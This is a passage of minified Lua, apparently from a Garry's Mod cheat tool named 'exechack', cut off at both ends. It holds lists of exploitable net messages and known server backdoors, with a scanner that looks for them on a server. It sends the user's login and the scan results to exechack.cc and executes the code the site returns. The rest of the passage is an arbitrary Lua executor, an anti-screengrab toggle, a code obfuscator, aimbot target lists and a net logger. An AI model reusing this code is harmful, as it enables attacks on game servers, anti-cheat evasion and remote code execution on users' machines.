Top10","ItemStoreUse","EZS_PlayerTag","simfphys_gasspill","sphys_dupe","sw_gokart","wordenns","SyncPrinterButtons16690","AttemptSellCar","uPLYWarning","atlaschat.rqclrcfg","dlib.getinfo.replicate","SetPermaKnife","EnterpriseWithdraw","SBP_addtime","NetData","CW20_PRESET_LOAD","minigun_drones_switch","NET_AM_MakePotion","bitcoins_request_turn_off","bitcoins_request_turn_on","bitcoins_request_withdraw","PermwepsNPCSellWeapon","ncpstoredoact","DuelRequestClient","BeginSpin","tickbookpayfine","fg_printer_money","IGS.GetPaymentURL","pp_info_send","AirDrops_StartPlacement","SlotsRemoved","FARMINGMOD_DROPITEM","cab_sendmessage","cab_cd_testdrive","blueatm","SCP-294Sv","dronesrewrite_controldr","desktopPrinter_Withdraw","RemoveTag","IDInv_RequestBank","UseMedkit","WipeMask","SwapFilter","RemoveMask","DeployMask","ZED_SpawnCar","levelup_useperk","passmayorexam","Selldatride","ORG_VaultDonate","ORG_NewOrg","ScannerMenu","misswd_accept","D3A_Message","LawsToServer","Shop_buy","D3A_CreateOrg","Gb_gasstation_BuyGas","Gb_gasstation_BuyJerrycan","MineServer","AcceptBailOffer","LawyerOfferBail","buy_bundle","AskPickupItemInv","donatorshop_itemtobuy","netOrgVoteInvite_Server","Chess ClientWager","AcceptRequest","deposit","CubeRiot CaptureZone Update","NPCShop_BuyItem","SpawnProtection","hoverboardpurchase","soundArrestCommit","LotteryMenu","updateLaws","TMC_NET_FirePlayer","thiefnpc","TMC_NET_MakePlayerWanted","SyncRemoveAction","HV_AmmoBuy","NET_CR_TakeStoredMoney","nox_addpremadepunishment","GrabMoney","LAWYER.GetBailOut","LAWYER.BailFelonOut","br_send_pm","GET_Admin_MSGS","OPEN_ADMIN_CHAT","LB_AddBan","redirectMsg","RDMReason_Explain","JB_SelectWarden","JB_GiveCubics","SendSteamID","wyozimc_playply","SpecDM_SendLoadout","sv_saveweapons","DL_StartReport","DL_ReportPlayer","DL_AskLogsList","DailyLoginClaim","GiveWeapon","GovStation_SpawnVehicle","inviteToOrganization","createFaction","sellitem","giveArrestReason","unarrestPerson","JoinFirstSS","bringNfreeze","start_wd_hack","DestroyTable","nCTieUpStart","IveBeenRDMed","FIGHTCLUB_StartFight","FIGHTCLUB_KickPlayer","ReSpawn","CP_Test_Results","AcceptBailOffer","IS_SubmitSID_C2S","IS_GetReward_C2S","ChangeOrgName","DisbandOrganization","CreateOrganization","newTerritory","InviteMember","sendDuelInfo","DoDealerDeliver","PurchaseWeed","guncraft_removeWorkbench","wordenns","userAcceptPrestige","vj_npcspawner_sv_create","DuelMessageReturn","Client_To_Server_OpenEditor","GiveSCP294Cup","GiveArmor100","SprintSpeedset","ArmorButton","HealButton","SRequest","ClickerForceSave","rpi_trade_end","NET_BailPlayer","vj_testentity_runtextsd","vj_fireplace_turnon2","requestmoneyforvk","gPrinters.sendID","FIRE_RemoveFireTruck","drugs_effect","drugs_give","NET_DoPrinterAction","opr_withdraw","money_clicker_withdraw","NGII_TakeMoney","gPrinters.retrieveMoney","revival_revive_accept","chname","NewRPNameSQL","UpdateRPUModelSQL","SetTableTarget","SquadGiveWeapon","BuyUpgradesStuff","REPAdminChangeLVL","SendMail","DemotePlayer","OpenGates","VehicleUnderglow","Hopping_Test","CREATE_REPORT","CreateEntity","FiremanLeave","DarkRP_Defib_ForceSpawn","Resupply","BTTTStartVotekick","_nonDBVMVote","REPPurchase","deathrag_takeitem","FacCreate","InformPlayer","lockpick_sound","SetPlayerModel","changeToPhysgun","VoteBanNO","VoteKickNO","shopguild_buyitem","MG2.Request.GangRankings","RequestMAPSize","gMining.sellMineral","ItemStoreDrop","optarrest","TalkIconChat","UpdateAdvBoneSettings","ViralsScoreboardAdmin","PowerRoundsForcePR","showDisguiseHUD","withdrawMoney","SyncPrinterButtons76561198027292625","phone","STLoanToServer","TCBDealerStore","TCBDealerSpawn","ts_buytitle","gMining.registerAchievement","gPrinters.openUpgrades"}local b={"Sbox_gm_attackofnullday_key","c","enablevac","ULXQUERY2","Im_SOCool","MoonMan","LickMeOut","SessionBackdoor","OdiumBackDoor","ULX_QUERY2","Sbox_itemstore","Sbox_darkrp","Sbox_Message","_blacksmurf","nostrip","Remove_Exploiters","Sandbox_ArmDupe","rconadmin","jesuslebg","disablebackdoor","blacksmurfBackdoor","jeveuttonrconleul","lag_ping","memeDoor","DarkRP_AdminWeapons","Fix_Keypads","noclipcloakaesp_chat_text","_CAC_ReadMemory","Ulib_Message","Ulogs_Infos","ITEM","nocheat","I?psilon","JQerystrip.disable","Sandbox_GayParty","DarkRP_UTF8","PlayerKilledLogged","OldNetReadData","Backdoor","cucked","NoNerks","kek","DarkRP_Money_System","BetStrep","ZimbaBackdoor","something","random","strip0","fellosnake","idk","||||","EnigmaIsthere","ALTERED_CARB0N","killserver","fuckserver","cvaraccess","_Defcon","dontforget","aze46aez67z67z64dcv4bt","nolag","changename","music","_Defqon","xenoexistscl","R8","AnalCavity","DefqonBackdoor","fourhead","echangeinfo","PlayerItemPickUp","thefrenchenculer","elfamosabackdoormdr","stoppk","noprop","reaper","Abcdefgh","JSQuery.Data(Post(false))","pjHabrp9EY","_Raze","88","Dominos","NoOdium_ReadPing","m9k_explosionradius","gag","_cac_","_Battleye_Meme_","legrandguzmanestla","ULogs_B","arivia","_Warns","xuy","samosatracking57","striphelper","m9k_explosive","GaySploitBackdoor","_GaySploit","slua","Bilboard.adverts:Spawn(false)","BOOST_FPS","FPP_AntiStrip","ULX_QUERY_TEST2","FADMIN_ANTICRASH","ULX_ANTI_BACKDOOR","UKT_MOMOS","rcivluz","SENDTEST","MJkQswHqfZ","INJ3v4","_clientcvars","_main","GMOD_NETDBG","thereaper","audisquad_lua","anticrash","ZernaxBackdoor","bdsm","waoz","stream","adm_network","antiexploit","ReadPing","berettabest","componenttolua","theberettabcd","negativedlebest","mathislebg","SparksLeBg","DOGE","FPSBOOST","N::B::P","PDA_DRM_REQUEST_CONTENT","shix","Inj3","AidsTacos","verifiopd","pwn_wake","pwn_http_answer","pwn_http_send","The_Dankwoo","PRDW_GET","fancyscoreboard_leave","DarkRP_Gamemodes","DarkRP_Armors","yohsambresicianatik<3","EnigmaProject","PlayerCheck","Ulx_Error_88","FAdmin_Notification_Receiver","DarkRP_ReceiveData","Weapon_88","__G____CAC","AbSoluT","mecthack","SetPlayerDeathCount","awarn_remove","fijiconn","nw.readstream","LuaCmd","The_DankWhy"}local c=0;local d=0;local e={}for f=1,10000 do local g=util.NetworkIDToString(f)if not g then break end;if table.HasValue(b,g)then c=c+1;table.insert(e,g.." "..f)if d<=c then d=c end elseif table.HasValue(a,g)then table.insert(e,g)c=c+1 else if d<3 then e={}end;c=0 end end;local h=""local i=0;for j=0,65536 do local k=util.NetworkIDToString(j)if k and k~=""then if not net.Receivers[k]then h=h..k;if table.HasValue(a,k)then i=i+1 end end end end;if i>15 then for l,m in SortedPairs(net.Receivers)do file.Append("]]..b.exploits..[[",l)end else file.Write("]]..b.exploits..[[",h)end if _G.Props_3 or _G.PropWhiteList then file.Append("]]..b.exploits..[[","spawnopropbypass")end]])end;timer.Simple(1,function()if IsValid(b.exploitslist)then b.exploitslist:Remove()end;b.exploitslist=vgui.Create("DScrollPanel",cW)b.exploitslist:SetPos(3,24+25+2)b.exploitslist:SetSize(230-6,246)b.exploitslist.Paint=function(h,ad,ae)surface.SetDrawColor(b.border)surface.DrawOutlinedRect(0,0,ad,ae)end;b.exploitslist.VBar.Paint=function(cK,ad,ae)draw.RoundedBox(0,0,0,ad,ae,Color(0,0,0,50))end;b.exploitslist.VBar.btnUp.Paint=function(cK,ad,ae)draw.RoundedBox(0,2,2,ad-4,ae-4,Color(0,0,0,25))draw.DrawText("▲","HudHintTextSmall",3,2,Color(255,255,255,255))end;b.exploitslist.VBar.btnDown.Paint=function(cK,ad,ae)draw.RoundedBox(0,2,2,ad-4,ae-4,Color(0,0,0,25))draw.DrawText("▼","HudHintTextSmall",3,2,Color(255,255,255,255))end;local cX=3;function addexploits(K,q,as,type)local cY=vgui.Create("DButton",b.exploitslist)cY:SetFont("hack_font_18")cY:SetText(K)cY:SetTextColor(b.colortext)cY:SetSize(select(1,surface.GetTextSize(K))+20,25)cY:SetPos(3,cX)cY.Paint=function(h,ad,ae)draw.RoundedBox(0,0,0,ad,ae,b.button)surface.SetDrawColor(b.border)surface.DrawOutlinedRect(0,0,ad,ae)if cY.Hovered then draw.RoundedBox(0,0,0,ad,ae,b.buttonhovered)end end;cY:SetToolTip(as)if type==nil then cY.DoClick=function()if IsInGame()then p(q)end end else cY.DoClick=q end;cX=cX+27 end;if IsInGame()then http.Post("https://exechack.cc/forum/thisgogo/exploits.php",{username=username,password=password,dmdkg=file.Read(b.exploits,"DATA")},RunStringEx)end end)end)cW:Hide()local cZ=vgui.Create("DFrame")cZ:SetSize(600,350)cZ:Center()cZ:SetTitle("")cZ:SetDraggable(true)cZ:MakePopup()cZ:ShowCloseButton(false)cZ.Paint=function(h,ad,ae)draw.RoundedBox(0,0,0,ad,ae,b.windowbg)draw.RoundedBox(0,0,0,ad,22,b.titlebar)draw.SimpleText("Target","hack_font_18",5,2.5,b.titletext)surface.SetDrawColor(b.border)surface.DrawOutlinedRect(0,0,ad,ae)end;a2("Disable all",517,25,80,25,cZ,function()z("MISC_SPECTATE_TARGET","")z("TEAMLIST",{})z("FRIENDLIST",{})z("RANKLIST",{})z("ENTITYLIST",{})z("AIM_ENTITYLIST",{})end)local c_=vgui.Create("DTextEntry",cZ)c_:SetPos(3,53)c_:SetSize(594,25)c_:SetText("")c_.Paint=function(self,ad,ae)surface.SetDrawColor(b.textentry)surface.DrawRect(0,0,ad,ae)self:DrawTextEntryText(Color(255,255,255),Color(30,130,255),Color(255,255,255))surface.SetDrawColor(b.border)surface.DrawOutlinedRect(0,0,ad,ae)end;c_.OnTextChanged=function()if IsValid(panelentityall)then findentityxd(c_:GetValue())end end;local cG=3;local function cH(cI,K,A)a2(K,cG,25,cI,25,cZ,A)cG=cG+cI+2 end;cH(49,"Entity",function()if IsInGame()then p('local a={}for b,c in pairs(ents.GetAll())do if not a[c:GetClass()]and IsEntity(c)then a[c:GetClass()]={a=c.PrintName,d=#ents.FindByClass(c:GetClass())}end end file.Write("'..b.allentity..'",util.TableToJSON(a))')end;timer.Simple(2,function()function findentityxd(d0)if IsValid(panelentityall)then panelentityall:Remove()end;panelentityall=vgui.Create("DScrollPanel",cZ)panelentityall:SetPos(3,53+27)panelentityall:SetSize(600-6,267)panelentityall.Paint=function(h,ad,ae)surface.SetDrawColor(b.border)surface.DrawOutlinedRect(0,0,ad,ae)end;panelentityall.VBar.Paint=function(cK,ad,ae)draw.RoundedBox(0,0,0,ad,ae,Color(0,0,0,50))end;panelentityall.VBar.btnUp.Paint=function(cK,ad,ae)draw.RoundedBox(0,2,2,ad-4,ae-4,Color(0,0,0,25))draw.DrawText("▲","HudHintTextSmall",3,2,Color(255,255,255,255))end;panelentityall.VBar.btnDown.Paint=function(cK,ad,ae)draw.RoundedBox(0,2,2,ad-4,ae-4,Color(0,0,0,25))draw.DrawText("▼","HudHintTextSmall",3,2,Color(255,255,255,255))end;local d1=1;local function d2(m,d3,d4)if string.find(string.lower(m),string.lower(d0))then local d5=vgui.Create("DButton",panelentityall)d5:SetSize(297,25)d5:SetPos(1,d1)d5:SetText('')d5.Paint=function(S,ad,ae)if d4==1 then draw.SimpleText("[NO".."T SPAWNED] "..m,"hack_font_18",2.5,2,b.colortext)elseif d3["a"]then draw.SimpleText(m.." ("..d3["d"]..")("..d3["a"]..")","hack_font_18",2.5,2,b.colortext)else draw.SimpleText(m.." ("..d3["d"]..")","hack_font_18",2.5,2,b.colortext)end end;local Y=t["ENTITYLIST"]local a8=panelentityall:Add("DCheckBoxLabel")a8:SetPos(300,d1+5)a8:SetText("Show")a8:SetFont("hack_font_18")a8:SetTextColor(b.colortext)if Y[m]then a8:SetValue(true)else a8:SetValue(false)end;function a8:OnChange(aS)if aS then Y[m]=true else Y[m]=nil end;z("ENTITYLIST",Y)end;function a8.Button:Paint(a9,aP)surface.SetDrawColor(b.checkbox)surface.DrawRect(0,0,a9,aP)if self:GetChecked()then surface.SetDrawColor(b.checkboxactive)surface.DrawRect(0,0,a9,aP)end;surface.SetDrawColor(b.border)surface.DrawOutlinedRect(0,0,a9,aP)end;local d6=t["ENTITYLISTclr"]local d7=vgui.Create("DButton",panelentityall)d7:SetSize(15,15)d7:SetPos(300+165+67,d1+6)d7:SetText('')d7.Paint=function(S,ad,ae)if d6[m.."_Color"]then draw.RoundedBox(0,0,0,ad,ae,d6[m.."_Color"])else draw.RoundedBox(0,0,0,ad,ae,Color(255,255,255))end end;d7.DoClick=function()ab(127,153+3,function()local am=vgui.Create("DColorMixer",doplpanel)am:SetPos(3,3)am:SetSize(121,150)am:SetAlphaBar(false)am:SetPalette(false)am:SetWangs(false)if d6[m.."_Color"]then am:SetColor(d6[m.."_Color"])end;am.ValueChanged=function()d6[m.."_Color"]=am:GetColor()z("ENTITYLISTclr",d6)end end)end;d1=d1+25 end end;local d8={}local d9=util.JSONToTable(file.Read(b.allentity,"DATA")or'[]')for m,d3 in pairs(d9)do d2(m,d3)d8[m]=true end;for m,d3 in pairs(I)do if not d8[m]then d2(m,nil,1)end end end;findentityxd("")end)end)cH(53,"Player",function()if IsInGame()then p([[local a={}for b,c in pairs(player.GetHumans())do a[c:Nick()]={steamid=c:SteamID64(),steamid32=c:SteamID(),id=c:UserID()}end;file.Write("]]..b.aimbotfriend..[[",util.TableToJSON(a))]])end;timer.Simple(2,function()function findentityxd(d0)if IsValid(panelentityall)then panelentityall:Remove()end;panelentityall=vgui.Create("DScrollPanel",cZ)panelentityall:SetPos(3,53+27)panelentityall:SetSize(600-6,267)panelentityall.Paint=function(h,ad,ae)surface.SetDrawColor(b.border)surface.DrawOutlinedRect(0,0,ad,ae)end;panelentityall.VBar.Paint=function(cK,ad,ae)draw.RoundedBox(0,0,0,ad,ae,Color(0,0,0,50))end;panelentityall.VBar.btnUp.Paint=function(cK,ad,ae)draw.RoundedBox(0,2,2,ad-4,ae-4,Color(0,0,0,25))draw.DrawText("▲","HudHintTextSmall",3,2,Color(255,255,255,255))end;panelentityall.VBar.btnDown.Paint=function(cK,ad,ae)draw.RoundedBox(0,2,2,ad-4,ae-4,Color(0,0,0,25))draw.DrawText("▼","HudHintTextSmall",3,2,Color(255,255,255,255))end;local d1=1;for da,db in pairs(util.JSONToTable(file.Read(b.aimbotfriend,"DATA")or'[]'))do if string.find(string.lower(da),string.lower(d0))then local d5=vgui.Create("DButton",panelentityall)d5:SetSize(297,25)d5:SetPos(1,d1)d5:SetText('')d5.Paint=function(h,ad,ae)draw.RoundedBox(0,0,0,ad,ae,b.windowbg)draw.SimpleText(da,"hack_font_18",2.5,2,b.colortext)end;local a8=panelentityall:Add("DCheckBoxLabel")a8:SetPos(300,d1+5)a8:SetText("Friend")a8:SetFont("hack_font_18")a8:SetTextColor(b.colortext)local dc=t["FRIENDLIST"]if dc[db["steamid32"]]==true then a8:SetValue(true)else a8:SetValue(false)end;function a8:OnChange(aS)if aS then dc[db["steamid32"]]=true else dc[db["steamid32"]]=false end;z("FRIENDLIST",dc)end;function a8.Button:Paint(a9,aP)surface.SetDrawColor(b.checkbox)surface.DrawRect(0,0,a9,aP)if self:GetChecked()then surface.SetDrawColor(b.checkboxactive)surface.DrawRect(0,0,a9,aP)end;surface.SetDrawColor(b.border)surface.DrawOutlinedRect(0,0,a9,aP)end;d1=d1+25 end end end;findentityxd("")end)end)cH(47,"Team",function()if IsInGame()then p([[local a={}for _,v in pairs(team.GetAllTeams())do a[v.Name]=true end file.Write("]]..b.aimteams..[[",util.TableToJSON(a))]])end;timer.Simple(2,function()function findentityxd(d0)if IsValid(panelentityall)then panelentityall:Remove()end;panelentityall=vgui.Create("DScrollPanel",cZ)panelentityall:SetPos(3,53+27)panelentityall:SetSize(600-6,267)panelentityall.Paint=function(h,ad,ae)surface.SetDrawColor(b.border)surface.DrawOutlinedRect(0,0,ad,ae)end;panelentityall.VBar.Paint=function(cK,ad,ae)draw.RoundedBox(0,0,0,ad,ae,Color(0,0,0,50))end;panelentityall.VBar.btnUp.Paint=function(cK,ad,ae)draw.RoundedBox(0,2,2,ad-4,ae-4,Color(0,0,0,25))draw.DrawText("▲","HudHintTextSmall",3,2,Color(255,255,255,255))end;panelentityall.VBar.btnDown.Paint=function(cK,ad,ae)draw.RoundedBox(0,2,2,ad-4,ae-4,Color(0,0,0,25))draw.DrawText("▼","HudHintTextSmall",3,2,Color(255,255,255,255))end;local d1=1;for da,db in pairs(util.JSONToTable(file.Read(b.aimteams,"DATA")or'[]'))do if string.find(string.lower(da),string.lower(d0))then local d5=vgui.Create("DButton",panelentityall)d5:SetSize(297,25)d5:SetPos(1,d1)d5:SetText('')d5.Paint=function(h,ad,ae)draw.RoundedBox(0,0,0,ad,ae,b.windowbg)draw.SimpleText(da,"hack_font_18",2.5,2,b.colortext)end;local dd=t["TEAMLIST"]local a8=panelentityall:Add("DCheckBoxLabel")a8:SetPos(300,d1+5)a8:SetText("Ignore")a8:SetFont("hack_font_18")a8:SetTextColor(b.colortext)if dd[da]==true then a8:SetValue(true)else a8:SetValue(false)end;function a8:OnChange(aS)if aS then dd[da]=true else dd[da]=false end;z("TEAMLIST",dd)end;function a8.Button:Paint(a9,aP)surface.SetDrawColor(b.checkbox)surface.DrawRect(0,0,a9,aP)if self:GetChecked()then surface.SetDrawColor(b.checkboxactive)surface.DrawRect(0,0,a9,aP)end;surface.SetDrawColor(b.border)surface.DrawOutlinedRect(0,0,a9,aP)end;d1=d1+25 end end end;findentityxd("")end)end)cH(45,"Rank",function()if IsInGame()then p([[local a={}for _,v in pairs(player.GetAll())do if not a[v:GetUserGroup()]then a[v:GetUserGroup()]=true end end file.Write("]]..b.aimranks..[[",util.TableToJSON(a))]])end;timer.Simple(2,function()function findentityxd(d0)if IsValid(panelentityall)then panelentityall:Remove()end;panelentityall=vgui.Create("DScrollPanel",cZ)panelentityall:SetPos(3,53+27)panelentityall:SetSize(600-6,267)panelentityall.Paint=function(h,ad,ae)surface.SetDrawColor(b.border)surface.DrawOutlinedRect(0,0,ad,ae)end;panelentityall.VBar.Paint=function(cK,ad,ae)draw.RoundedBox(0,0,0,ad,ae,Color(0,0,0,50))end;panelentityall.VBar.btnUp.Paint=function(cK,ad,ae)draw.RoundedBox(0,2,2,ad-4,ae-4,Color(0,0,0,25))draw.DrawText("▲","HudHintTextSmall",3,2,Color(255,255,255,255))end;panelentityall.VBar.btnDown.Paint=function(cK,ad,ae)draw.RoundedBox(0,2,2,ad-4,ae-4,Color(0,0,0,25))draw.DrawText("▼","HudHintTextSmall",3,2,Color(255,255,255,255))end;local d1=1;for da,db in pairs(util.JSONToTable(file.Read(b.aimranks,"DATA")or'[]'))do if string.find(string.lower(da),string.lower(d0))then local d5=vgui.Create("DButton",panelentityall)d5:SetSize(297,25)d5:SetPos(1,d1)d5:SetText('')d5.Paint=function(h,ad,ae)draw.RoundedBox(0,0,0,ad,ae,b.windowbg)draw.SimpleText(da,"hack_font_18",2.5,2,b.colortext)end;local de=t["RANKLIST"]local a8=panelentityall:Add("DCheckBoxLabel")a8:SetPos(300,d1+5)a8:SetText("Ignore")a8:SetFont("hack_font_18")a8:SetTextColor(b.colortext)if de[da]==true then a8:SetValue(true)else a8:SetValue(false)end;function a8:OnChange(aS)if aS then de[da]=true else de[da]=false end;z("RANKLIST",de)end;function a8.Button:Paint(a9,aP)surface.SetDrawColor(b.checkbox)surface.DrawRect(0,0,a9,aP)if self:GetChecked()then surface.SetDrawColor(b.checkboxactive)surface.DrawRect(0,0,a9,aP)end;surface.SetDrawColor(b.border)surface.DrawOutlinedRect(0,0,a9,aP)end;d1=d1+25 end end end;findentityxd("")end)end)cZ:Hide()local a={}a.URL="https://exechack.cc/metaconstract"a.COMPILE="C"local R={["\\"]="\\\\",["\0"]="\\0",["\b"]="\\b",["\t"]="\\t",["\n"]="\\n",["\v"]="\\v",["\f"]="\\f",["\r"]="\\r",["\""]="\\\"",["\'"]="\\\'"}function a:Init()self.Code=""self.ErrorPanel=self:Add("DButton")self.ErrorPanel:SetFont('BudgetLabel')self.ErrorPanel:SetTextColor(Color(255,255,255))self.ErrorPanel:SetText("")self.ErrorPanel:SetTall(0)self.ErrorPanel.DoClick=function()self:GotoErrorLine()end;self.ErrorPanel.DoRightClick=function(self)SetClipboardText(self:GetText())end;self.ErrorPanel.Paint=function(self,G,S)surface.SetDrawColor(255,50,50)surface.DrawRect(0,0,G,S)end;self:StartHTML()end;function a:Think()if self.NextValidate and self.NextValidate<CurTime()then self:ValidateCode()end end;function a:StartHTML()self.HTML=self:Add("DHTML")self:AddJavascriptCallback("OnCode")self:AddJavascriptCallback("OnLog")self.HTML:OpenURL(self.URL)self.HTML:RequestFocus()end;function a:ReloadHTML()self.HTML:OpenURL(self.URL)end;function a:JavascriptSafe(e)e=e:gsub(".",R)e=e:gsub("\226\128\168","\\\226\128\168")e=e:gsub("\226\128\169","\\\226\128\169")return e end;function a:CallJS(w)self.HTML:Call(w)end;function a:AddJavascriptCallback(T)local ae=self[T]self.HTML:AddFunction("gmodinterface",T,function(...)ae(self,HTML,...)end)end;function a:OnCode(d,df)self.NextValidate=CurTime()+0.2;self.Code=df end;function a:OnLog(d,...)print(...)end;function a:SetCode(df)self.Code=df;self:CallJS('SetContent("'..self:JavascriptSafe(df)..'");')end;function a:GetCode()return self.Code end;function a:SetGutterError(aP,av)self:CallJS("SetErr('"..aP.."','"..self:JavascriptSafe(av).."')")end;function a:GotoLine(dg)self:CallJS("GotoLine('"..dg.."')")end;function a:ClearGutter()self:CallJS("ClearErr()")end;function a:GotoErrorLine()self:GotoLine(self.ErrorLine or 1)end;function a:SetError(bV)if not IsValid(self.HTML)then self.ErrorPanel:SetText("")self:ClearGutter()return end;local ax=0;if bV then local a7,bV=string.match(bV,self.COMPILE..":(%d*):(.+)")if a7 and bV then ax=20;self.ErrorPanel:SetText(a7 and bV and"ERROR Line "..a7 ..": "..bV or bV or"")self.ErrorLine=tonumber(string.match(bV," at line (%d)%)")or a7)or 1;self:SetGutterError(self.ErrorLine,bV)end else self.ErrorPanel:SetText("")self:ClearGutter()end;local a8=self:GetWide()local a9=self:GetTall()self.ErrorPanel:SetPos(0,a9-ax)self.ErrorPanel:SetSize(a8,ax)self.HTML:SetSize(a8,a9-ax)end;function a:ValidateCode()local aa=SysTime()local df=self:GetCode()self.NextValidate=nil;if not df or df==""then self:SetError()return end;local dh=CompileString(df,self.COMPILE,false)aa=SysTime()-aa;if type(dh)=="string"then self:SetError(dh)elseif aa>0.25 then self:SetError("Compiling took too long. ("..math.Round(aa*1000)..")")else self:SetError()end end;function a:PerformLayout(G,S)local ax=self.ErrorPanel:GetTall()self.ErrorPanel:SetPos(0,S-ax)self.ErrorPanel:SetSize(G,ax)self.HTML:SetSize(G,S-ax)end;vgui.Register("lua_executer",a,"EditablePanel")local di=vgui.Create("DFrame")di:SetSize(650,380)di:Center()di:SetTitle("")di:SetDraggable(true)di:MakePopup()di:ShowCloseButton(false)di:SetSizable(true)di.Paint=function(h,ad,ae)draw.RoundedBox(0,0,0,ad,ae,b.windowbg)draw.RoundedBox(0,0,0,ad,22,b.titlebar)draw.SimpleText("Loader","hack_font_18",5,2.5,b.titletext)surface.SetDrawColor(b.border)surface.DrawOutlinedRect(0,0,ad,ae)end;a1.runscriptloader=vgui.Create("DButton",di)a1.runscriptloader:SetFont("hack_font_18")a1.runscriptloader:SetText("Run Script")a1.runscriptloader:SetTextColor(b.colortext)a1.runscriptloader:SetSize(75,25)a1.runscriptloader:SetToolTip("Left button - run to ClientSide, Right button - run to MenuState.")a1.runscriptloader.Paint=function(h,ad,ae)draw.RoundedBox(0,0,0,ad,ae,b.button)surface.SetDrawColor(b.border)surface.DrawOutlinedRect(0,0,ad,ae)if a1.runscriptloader.Hovered then draw.RoundedBox(0,0,0,ad,ae,b.buttonhovered)end end;a1.runscriptloader.DoClick=function()if IsInGame()then if a1.exective.ErrorPanel:GetText()==""then p(a1.exective:GetCode(),t["LUALOADER_ANTISG"])else a1.exective.ErrorPanel:GotoLine(string.Explode(":",a1.exective.ErrorPanel:GetText())[1]:Replace("ERROR Line ",""))a1.exective.ErrorPanel:SetText("The script has errors no".."t available to run!")end end end;a1.runscriptloader.DoRightClick=function()if a1.exective.ErrorPanel:GetText()==""then RunString(a1.exective:GetCode())else a1.exective.ErrorPanel:GotoLine(string.Explode(":",a1.exective.ErrorPanel:GetText())[1]:Replace("ERROR Line ",""))a1.exective.ErrorPanel:SetText("The script has errors no".."t available to run!")end end;a1.openfileloader=vgui.Create("DButton",di)a1.openfileloader:SetFont("hack_font_18")a1.openfileloader:SetText("Save")a1.openfileloader:SetTextColor(b.colortext)a1.openfileloader:SetSize(50-12,25)a1.openfileloader.Paint=function(h,ad,ae)draw.RoundedBox(0,0,0,ad,ae,b.button)surface.SetDrawColor(b.border)surface.DrawOutlinedRect(0,0,ad,ae)if a1.openfileloader.Hovered then draw.RoundedBox(0,0,0,ad,ae,b.buttonhovered)end end;a1.openfileloader.DoClick=function()ab(200,200,function()local c_=vgui.Create("DTextEntry",doplpanel)c_:SetPos(3,30)c_:SetSize(194,25)c_:SetText("")c_.Paint=function(self,ad,ae)surface.SetDrawColor(b.textentry)surface.DrawRect(0,0,ad,ae)self:DrawTextEntryText(Color(255,255,255),Color(30,130,255),Color(255,255,255))surface.SetDrawColor(b.border)surface.DrawOutlinedRect(0,0,ad,ae)end;c_.OnTextChanged=function()if IsValid(cfgtable)then b.fcfg(c_:GetValue())end end;function b.fcfg(dj)if IsValid(cfgtable)then cfgtable:Remove()end;cfgtable=vgui.Create("DScrollPanel",doplpanel)cfgtable:SetPos(3,30+27)cfgtable:SetSize(194,100+67-27)cfgtable.Paint=function(a8,a9,aa)surface.SetDrawColor(b.border)surface.DrawOutlinedRect(0,0,a9,aa)end;local dk=3;for w,x in pairs(exec_List("C:/exechack")or{})do if not x:find(".cfgexec")and x~="loginandpassword"then if string.find(string.lower(x),string.lower(dj or"")or"")then local dl=x;a2("-",3,dk,25,25,cfgtable,function()exec_Delete("C:/exechack".."/"..x)b.fcfg()end)a2(dl,30,dk,select(1,surface.GetTextSize(dl))+10,25,cfgtable,function()a1.exective:SetCode(exec_Read("C:/exechack".."/"..x))end)dk=dk+27 end end end end;a2("Create",3,3,50,25,doplpanel,function()Derma_StringRequest("add 'autorun' to lua name to activate autoload","Name","",function(T)exec_CreateDir("C:/exechack")exec_Write("C:/exechack".."/"..T..".lua",a1.exective:GetCode())b.fcfg()end)end)a2("Refresh",3+50+2,3,58,25,doplpanel,b.fcfg)b.fcfg()end)end;a1.lsc=vgui.Create("DButton",di)a1.lsc:SetFont("hack_font_18")a1.lsc:SetText("Protect")a1.lsc:SetTextColor(b.colortext)a1.lsc:SetSize(67-12,25)a1.lsc.Paint=function(h,ad,ae)draw.RoundedBox(0,0,0,ad,ae,b.button)surface.SetDrawColor(b.border)surface.DrawOutlinedRect(0,0,ad,ae)if a1.lsc.Hovered then draw.RoundedBox(0,0,0,ad,ae,b.buttonhovered)end end;a1.lsc.DoClick=function()ab(170,21,function()au("Anti Screengrab","LUALOADER_ANTISG",3,2,doplpanel,"Use on you risk")end)end;a1.obf=vgui.Create("DButton",di)a1.obf:SetFont("hack_font_18")a1.obf:SetText("Obfuscate")a1.obf:SetTextColor(b.colortext)a1.obf:SetSize(80,25)a1.obf.Paint=function(h,ad,ae)draw.RoundedBox(0,0,0,ad,ae,b.button)surface.SetDrawColor(b.border)surface.DrawOutlinedRect(0,0,ad,ae)if a1.obf.Hovered then draw.RoundedBox(0,0,0,ad,ae,b.buttonhovered)end end;a1.obf.DoClick=function()if not a1.exective:GetCode():find("local Q=_G;local q,w,e,r,t,y,u,i,o,p,a,s")then local function dm(m,ad)local function ay(dn)e=""for aG=1,string.len(dn)do e=e..'\\'..string.byte(dn,aG)end;return e end;math.randomseed(1/(os.clock()*1e3))function obff(dp,m)if m<=0 then return dp end;local ad=math.floor(math.random()*10000000)math.randomseed(ad)local R=string.gsub(dp,".",function(dp)return string.format("%02x",bit.bxor(string.byte(dp),math.random(0,255)))end)return obff('local Q=_G;local q,w,e,r,t,y,u,i,o,p,a,s='..ad..',"'..ay(R)..'",16,0,255,"'..ay("%x%x")..'",Q["'..ay("string")..'"]["'..ay("char")..'"],Q["'..ay("bit")..'"]["'..ay("bxor")..'"],Q["'..ay("tonumber")..'"],Q["'..ay("math")..'"]["'..ay("random")..'"],Q["'..ay("math")..'"]["'..ay("randomseed")..'"],Q["'..ay("RunString")..'"];a(q)s((w):gsub(y,function(c)return u(i(o(c,e),p(r,t)))end))',m-1)end;return obff(m,ad)end;a1.exective:SetCode(dm(a1.exective:GetCode(),1))end end;a1.netlog=vgui.Create("DButton",di)a1.netlog:SetFont("hack_font_18")a1.netlog:SetText("Net Logger")a1.netlog:SetTextColor(b.colortext)a1.netlog:SetSize(86,25)a1.netlog.Paint=function(h,ad,ae)draw.RoundedBox(0,0,0,ad,ae,b.button)surface.SetDrawColor(b.border)surface.DrawOutlinedRect(0,0,ad,ae)if a1.netlog.Hovered then draw.RoundedBox(0,0,0,ad,ae,b.buttonhovered)end end;a1.netlog.DoClick=function()ab(250,280-50,function()a2("Run Logger",3,3,84,25,doplpanel,function()if not IsInGame()then return end;if not file.Exists(b.netlogtxt,"DATA")then file.Write(b.netlogtxt,"[]")end;j=false;p([[
local b,dstring=""
local a=a or{
["SendToServer"]=net.SendToServer,
["Start"]=net.Start,
["WriteAngle"]=net.WriteAngle,
["WriteBit"]=net.WriteBit,
